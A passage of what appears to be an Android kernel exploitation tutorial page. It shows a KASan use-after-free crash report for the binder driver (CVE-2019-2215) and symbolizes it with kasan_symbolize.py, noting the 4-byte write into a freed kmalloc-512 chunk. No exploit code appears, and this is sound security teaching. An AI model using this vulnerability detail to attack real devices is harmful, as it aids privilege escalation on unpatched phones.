[  382.436825]  __fput+0x1f2/0x51d
[  382.437483]  ____fput+0x15/0x18
[  382.438145]  task_work_run+0x127/0x154
[  382.438932]  do_exit+0x818/0x2384
[  382.439642]  ? mm_update_next_owner+0x52f/0x52f
[  382.440555]  do_group_exit+0x12c/0x24b
[  382.441247]  ? do_group_exit+0x24b/0x24b
[  382.441964]  SYSC_exit_group+0x17/0x17
[  382.442652]  SyS_exit_group+0x14/0x14
[  382.443264]  do_syscall_64+0x19e/0x225
[  382.443920]  entry_SYSCALL_64_after_hwframe+0x3d/0xa2
[  382.444784] RIP: 0033:0x4047d7
[  382.445341] RSP: 002b:00007ffe9760fe18 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
[  382.446661] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00000000004047d7
[  382.447904] RDX: 0000000000000002 RSI: 0000000000001000 RDI: 0000000000000000
[  382.449190] RBP: 0000000000000000 R08: 0000000000482335 R09: 0000000000000000
[  382.450517] R10: 00007ffe9760fe10 R11: 0000000000000246 R12: 0000000000400190
[  382.451889] R13: 00000000004a4618 R14: 00000000004002e0 R15: 00007ffe9760fee0
[  382.453146] 
[  382.453427] Allocated by task 7682:
[  382.454054]  save_stack_trace+0x16/0x18
[  382.454738]  __kasan_kmalloc+0x133/0x1cc
[  382.455445]  kasan_kmalloc+0x9/0xb
[  382.456063]  kmem_cache_alloc_trace+0x1bd/0x26f
[  382.456869]  binder_get_thread+0x166/0x6db
[  382.457605]  binder_poll+0x4c/0x1c2
[  382.458235]  SyS_epoll_ctl+0x1558/0x24f0
[  382.458910]  do_syscall_64+0x19e/0x225
[  382.459598]  entry_SYSCALL_64_after_hwframe+0x3d/0xa2
[  382.460525]  0xffffffffffffffff
[  382.461085] 
[  382.461334] Freed by task 7682:
[  382.461762]  save_stack_trace+0x16/0x18
[  382.462222]  __kasan_slab_free+0x18f/0x23f
[  382.462711]  kasan_slab_free+0xe/0x10
[  382.463149]  kfree+0x193/0x5b3
[  382.463538]  binder_thread_dec_tmpref+0x192/0x1d9
[  382.464095]  binder_thread_release+0x464/0x4bd
[  382.464623]  binder_ioctl+0x48a/0x101c
[  382.465071]  do_vfs_ioctl+0x608/0x106a
[  382.465518]  SyS_ioctl+0x75/0xa4
[  382.465906]  do_syscall_64+0x19e/0x225
[  382.466358]  entry_SYSCALL_64_after_hwframe+0x3d/0xa2
[  382.466953]  0xffffffffffffffff
[  382.467335] 
[  382.467783] The buggy address belongs to the object at ffff88804e486528
[  382.467783]  which belongs to the cache kmalloc-512 of size 512
[  382.469983] The buggy address is located 160 bytes inside of
[  382.469983]  512-byte region [ffff88804e486528, ffff88804e486728)
[  382.472065] The buggy address belongs to the page:
[  382.472915] page:ffffea0001392100 count:1 mapcount:0 mapping:          (null) index:0xffff88804e4872a8 compound_mapcount: 0
[  382.474871] flags: 0x4000000000010200(slab|head)
[  382.475744] raw: 4000000000010200 0000000000000000 ffff88804e4872a8 000000010012000e
[  382.476960] raw: ffffea00015fb220 ffff88805ac01650 ffff88805ac0cf40 0000000000000000
[  382.478072] page dumped because: kasan: bad access detected
[  382.478784] 
[  382.478973] Memory state around the buggy address:
[  382.479571]  ffff88804e486480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  382.480479]  ffff88804e486500: fc fc fc fc fc fb fb fb fb fb fb fb fb fb fb fb
[  382.481318] &gt;ffff88804e486580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  382.482155]                                               ^
[  382.482806]  ffff88804e486600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  382.483648]  ffff88804e486680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  382.484485] ==================================================================
</code></pre><p>Few things to note from the crash log:</p>
<ul>
<li>This is a <code>Use after Free</code> vulnerability</li>
<li>Crashed while writing <strong>4 bytes</strong> in the dangling chunk</li>
<li>The dangling chunk belong to <code>kmalloc-512</code> cache</li>
</ul>
<h2 id="kasan-symbolizer">KASan Symbolizer </h2>
<p>The above crash log is not very intuitive. We can symbolize the stack traces using <a href="https://github.com/google/sanitizers/blob/master/address-sanitizer/tools/kasan_symbolize.py" target="_blank"><code>kasan_symbolize.py</code></a>.</p>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:/tmp$ <span class="token function">cat</span> report.txt <span class="token operator">|</span> python kasan_symbolize.py --linux<span class="token operator">=</span>~/workshop/android-4.14-dev/out/kasan/ --strip<span class="token operator">=</span>/home/ashfaq/workshop/android-4.14-dev/goldfish/
</code></pre>
<pre class="language-"><code>==================================================================
BUG: KASAN: use-after-free in[&lt;     inline     &gt;] atomic_cmpxchg include/asm-generic/atomic-instrumented.h:57
BUG: KASAN: use-after-free in[&lt;     inline     &gt;] queued_spin_lock include/asm-generic/qspinlock.h:87
BUG: KASAN: use-after-free in[&lt;     inline     &gt;] do_raw_spin_lock_flags include/linux/spinlock.h:173
BUG: KASAN: use-after-free in[&lt;     inline     &gt;] __raw_spin_lock_irqsave include/linux/spinlock_api_smp.h:119
BUG: KASAN: use-after-free in[&lt;        none        &gt;] _raw_spin_lock_irqsave+0x3a/0x5d kernel/locking/spinlock.c:160
Write of size 4 at addr ffff88804e4865c8 by task cve-2019-2215-t/7682

CPU: 1 PID: 7682 Comm: cve-2019-2215-t Tainted: G        W       4.14.150+ #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.11.1-0-g0551a4be2c-prebuilt.qemu-project.org 04/01/2014
Call Trace:
[&lt;     inline     &gt;] __dump_stack lib/dump_stack.c:17
[&lt;        none        &gt;] dump_stack+0x78/0xbe lib/dump_stack.c:53
[&lt;        none        &gt;] print_address_description+0x81/0x25d mm/kasan/report.c:187
 ?[&lt;     inline     &gt;] atomic_cmpxchg include/asm-generic/atomic-instrumented.h:57
 ?[&lt;     inline     &gt;] queued_spin_lock include/asm-generic/qspinlock.h:87
 ?[&lt;     inline     &gt;] do_raw_spin_lock_flags include/linux/spinlock.h:173
 ?[&lt;     inline     &gt;] __raw_spin_lock_irqsave include/linux/spinlock_api_smp.h:119
 ?[&lt;        none        &gt;] _raw_spin_lock_irqsave+0x3a/0x5d kernel/locking/spinlock.c:160
[&lt;        none        &gt;] __kasan_report+0x14f/0x180 mm/kasan/report.c:316
 ?[&lt;     inline     &gt;] atomic_cmpxchg include/asm-generic/atomic-instrumented.h:57
 ?[&lt;     inline     &gt;] queued_spin_lock include/asm-generic/qspinlock.h:87
 ?[&lt;     inline     &gt;] do_raw_spin_lock_flags include/linux/spinlock.h:173
 ?[&lt;     inline     &gt;] __raw_spin_lock_irqsave include/linux/spinlock_api_smp.h:119
 ?[&lt;        none        &gt;] _raw_spin_lock_irqsave+0x3a/0x5d kernel/locking/spinlock.c:160
[&lt;        none        &gt;] kasan_report+0x26/0x49 mm/kasan/common.c:626
[&lt;     inline     &gt;] check_memory_region_inline mm/kasan/generic.c:182
[&lt;        none        &gt;] check_memory_region+0x171/0x17e mm/kasan/generic.c:191
[&lt;        none        &gt;] kasan_check_write+0x14/0x16 mm/kasan/common.c:106
[&lt;     inline     &gt;] atomic_cmpxchg include/asm-generic/atomic-instrumented.h:57
[&lt;     inline     &gt;] queued_spin_lock include/asm-generic/qspinlock.h:87
[&lt;     inline     &gt;] do_raw_spin_lock_flags include/linux/spinlock.h:173
[&lt;     inline     &gt;] __raw_spin_lock_irqsave include/linux/spinlock_api_smp.h:119
[&lt;        none        &gt;] _raw_spin_lock_irqsave+0x3a/0x5d kernel/locking/spinlock.c:160
[&lt;        none        &gt;] remove_wait_queue+0x27/0x122 kernel/sched/wait.c:50
 ?[&lt;        none        &gt;] fsnotify_unmount_inodes+0x1e8/0x1e8 fs/notify/fsnotify.c:99
[&lt;     inline     &gt;] ep_remove_wait_queue fs/eventpoll.c:612
[&lt;        none        &gt;] ep_unregister_pollwait+0x160/0x1bd fs/eventpoll.c:630
[&lt;        none        &gt;] ep_free+0x8b/0x181 fs/eventpoll.c:847
 ?[&lt;        none        &gt;] ep_eventpoll_poll+0x228/0x228 fs/eventpoll.c:942
[&lt;        none        &gt;] ep_eventpoll_release+0x48/0x54 fs/eventpoll.c:879
[&lt;        none        &gt;] __fput+0x1f2/0x51d fs/file_table.c:210
[&lt;        none        &gt;] ____fput+0x15/0x18 fs/file_table.c:244
[&lt;        none        &gt;] task_work_run+0x127/0x154 kernel/task_work.c:113
[&lt;     inline     &gt;] exit_task_work include/linux/task_work.h:22
[&lt;        none        &gt;] do_exit+0x818/0x2384 kernel/exit.c:875
 ?[&lt;        none        &gt;] mm_update_next_owner+0x52f/0x52f kernel/exit.c:468
[&lt;        none        &gt;] do_group_exit+0x12c/0x24b kernel/exit.c:978
 ?[&lt;     inline     &gt;] spin_unlock_irq include/linux/spinlock.h:367
 ?[&lt;        none        &gt;] do_group_exit+0x24b/0x24b kernel/exit.c:975
[&lt;        none        &gt;] SYSC_exit_group+0x17/0x17 kernel/exit.c:989
[&lt;        none        &gt;] SyS_exit_group+0x14/0x14 kernel/exit.c:987
[&lt;        none        &gt;] do_syscall_64+0x19e/0x225 arch/x86/entry/common.c:292
[&lt;        none        &gt;] entry_SYSCALL_64_after_hwframe+0x3d/0xa2 arch/x86/entry/entry_64.S:233
RIP: 0033:0x4047d7
RSP: 002b:00007ffe9760fe18 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00000000004047d7
RDX: 0000000000000002 RSI: 0000000000001000 RDI: 0000000000000000
RBP: 0000000000000000 R08: 0000000000482335 R09: 0000000000000000
R10: 00007ffe9760fe10 R11: 0000000000000246 R12: 0000000000400190
R13: 00000000004a4618 R14: 00000000004002e0 R15: 00007ffe9760fee0

Allocated by task 7682:
[&lt;        none        &gt;] save_stack_trace+0x16/0x18 arch/x86/kernel/stacktrace.c:59
[&lt;     inline     &gt;] save_stack mm/kasan/common.c:76
[&lt;     inline     &gt;] set_track mm/kasan/common.c:85
[&lt;        none        &gt;] __kasan_kmalloc+0x133/0x1cc mm/kasan/common.c:501
[&lt;        none        &gt;] kasan_kmalloc+0x9/0xb mm/kasan/common.c:515
[&lt;        none        &gt;] kmem_cache_alloc_trace+0x1bd/0x26f mm/slub.c:2819
[&lt;     inline     &gt;] kmalloc include/linux/slab.h:488
[&lt;     inline     &gt;] kzalloc include/linux/slab.h:661
[&lt;        none        &gt;] binder_get_thread+0x166/0x6db drivers/android/binder.c:4677
[&lt;        none        &gt;] binder_poll+0x4c/0x1c2 drivers/android/binder.c:4805
[&lt;     inline     &gt;] ep_item_poll fs/eventpoll.c:888
[&lt;     inline     &gt;] ep_insert fs/eventpoll.c:1476
[&lt;     inline     &gt;] SYSC_epoll_ctl fs/eventpoll.c:2128
[&lt;        none        &gt;] SyS_epoll_ctl+0x1558/0x24f0 fs/eventpoll.c:2014
[&lt;        none        &gt;] do_syscall_64+0x19e/0x225 arch/x86/entry/common.c:292
[&lt;        none        &gt;] entry_SYSCALL_64_after_hwframe+0x3d/0xa2 arch/x86/entry/entry_64.S:233
 0xffffffffffffffff

Freed by task 7682:
[&lt;        none        &gt;] save_stack_trace+0x16/0x18 arch/x86/kernel/stacktrace.c:59
[&lt;     inline     &gt;] save_stack mm/kasan/common.c:76
[&lt;     inline     &gt;] set_track mm/kasan/common.c:85
[&lt;        none        &gt;] __kasan_slab_free+0x18f/0x23f mm/kasan/common.c:463
[&lt;        none        &gt;] kasan_slab_free+0xe/0x10 mm/kasan/common.c:471
[&lt;     inline     &gt;] slab_free_hook mm/slub.c:1407
[&lt;     inline     &gt;] slab_free_freelist_hook mm/slub.c:1458
[&lt;     inline     &gt;] slab_free mm/slub.c:3039
[&lt;        none        &gt;] kfree+0x193/0x5b3 mm/slub.c:3976
[&lt;     inline     &gt;] binder_free_thread drivers/android/binder.c:4705
[&lt;        none        &gt;] binder_thread_dec_tmpref+0x192/0x1d9 drivers/android/binder.c:2053
[&lt;        none        &gt;] binder_thread_release+0x464/0x4bd drivers/android/binder.c:4794
[&lt;        none        &gt;] binder_ioctl+0x48a/0x101c drivers/android/binder.c:5062
[&lt;        none        &gt;] do_vfs_ioctl+0x608/0x106a fs/ioctl.c:46
[&lt;     inline     &gt;] SYSC_ioctl fs/ioctl.c:701
[&lt;        none        &gt;] SyS_ioctl+0x75/0xa4 fs/ioctl.c:692
[&lt;        none        &gt;] do_syscall_64+0x19e/0x225 arch/x86/entry/common.c:292
[&lt;        none        &gt;] entry_SYSCALL_64_after_hwframe+0x3d/0xa2 arch/x86/entry/entry_64.S:233
 0xffffffffffffffff

The buggy address belongs to the object at ffff88804e486528
 which belongs to the cache kmalloc-512 of size 512
The buggy address is located 160 bytes inside of
 512-byte region [ffff88804e486528, ffff88804e486728)
The buggy address belongs to the page:
page:ffffea0001392100 count:1 mapcount:0 mapping:          (null) index:0xffff88804e4872a8 compound_mapcount: 0
flags: 0x4000000000010200(slab|head)
raw: 4000000000010200 0000000000000000 ffff88804e4872a8 000000010012000e
raw: ffffea00015fb220 ffff88805ac01650 ffff88805ac0cf40 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff88804e486480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff88804e486500: fc fc fc fc fc fb fb fb fb fb fb fb fb fb fb fb
&gt;ffff88804e486580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                                              ^
 ffff88804e486600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
 ffff88804e486680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
==================================================================
</code></pre><p>Isn&apos;t this more useful than the previous crash log.</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="vulnerability-discovery.html#patch" class="navigation navigation-prev " aria-label="Previous page: Patch">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="vulnerability-trigger.html#reintroduction" class="navigation navigation-next " aria-label="Next page: Reintroduction">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Vulnerability Trigger","level":"1.5","depth":1,"next":{"title":"Reintroduction","level":"1.5.1","depth":2,"anchor":"#reintroduction","path":"chapters/vulnerability-trigger.md","ref":"chapters/vulnerability-trigger.md#reintroduction","articles":[]},"previous":{"title":"Patch","level":"1.4.3","depth":2,"anchor":"#patch","path":"chapters/vulnerability-discovery.md","ref":"chapters/vulnerability-discovery.md#patch","articles":[]},"dir":"ltr"},"config":{"plugins":["-livereload","-highlight","collapsible-chapters","github","sharing","ga","prism","prism-themes"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-atom-dark.css"]},"github":{"url":"https://github.com/cloudfuzz/android-kernel-exploitation"},"search":{},"collapsible-chapters":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"night","family":"sans","size":2},"prism-themes":{},"ga":{"configuration":"auto","token":"UA-163782039-1"},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":true,"vk":false,"weibo":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"Ashfaq Ansari (@HackSysTeam)","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Android Kernel Exploitation","gitbook":"*"},"file":{"path":"chapters/vulnerability-trigger.md","mtime":"2020-10-01T13:09:59.278Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-10-01T13:10:35.750Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

